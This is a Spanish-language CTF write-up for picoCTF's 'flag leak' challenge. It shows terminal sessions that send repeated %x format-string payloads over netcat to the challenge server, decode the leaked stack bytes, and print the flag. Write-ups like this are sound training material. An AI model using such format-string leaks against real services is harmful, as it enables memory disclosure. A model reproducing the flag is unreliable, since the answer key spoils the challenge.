# flag leak

## Descripcion
Story telling class 1/2 I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/92/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/92/vuln.c). And connect with it using: `nc saturn.picoctf.net 62620`

## Pistas
- 

## Solución

```
eltetor14-picoctf@webshell:~$ wget https://artifacts.picoctf.net/c/92/vuln
--2023-05-28 22:38:59--  https://artifacts.picoctf.net/c/92/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 108.156.172.42, 108.156.172.74, 108.156.172.120, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|108.156.172.42|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15876 (16K) [application/octet-stream]
Saving to: 'vuln'

vuln                                            100%[======================================================================================================>]  15.50K  --.-KB/s    in 0.006s  

2023-05-28 22:38:59 (2.44 MB/s) - 'vuln' saved [15876/15876]

eltetor14-picoctf@webshell:~$ nc saturn.picoctf.net 62620
Tell me a story and then I'll tell you one >> %x
Here's a story - 
ff8381c0
%x%x%x%x%x%x%x%x%x
eltetor14-picoctf@webshell:~$ nc saturn.picoctf.net 62620
Tell me a story and then I'll tell you one >> %x%x%x%x%x%x%x%x%x
Here's a story - 
ffcb90b0ffcb90d0804934678257825782578257825782578257825f7007825ffffffff

eltetor14-picoctf@webshell:~$ nc saturn.picoctf.net 62620
Tell me a story and then I'll tell you one >> %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Here's a story - 
ffeab7c0ffeab7e08049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578252578256f6369707b4654436b34334c5f676e3167346c466666305f3474535f665f6b63633130667d653833fbad200079c5e4000f7f76990804c00080494100804c000ffeab8a880494182ffeab954ffeab9600ffeab8c000f7d6ced5

ocip{FTCk43L_gn1g4lFff0_4tS_f_kcc10f}e83

Swap endianness:

picoCTF{L34k1ng_Fl4g_0ff_St4ck_ff01c38e}
```

## Bandera
picoCTF{L34k1ng_Fl4g_0ff_St4ck_ff01c38e}

## Notas adicionales

## Referencias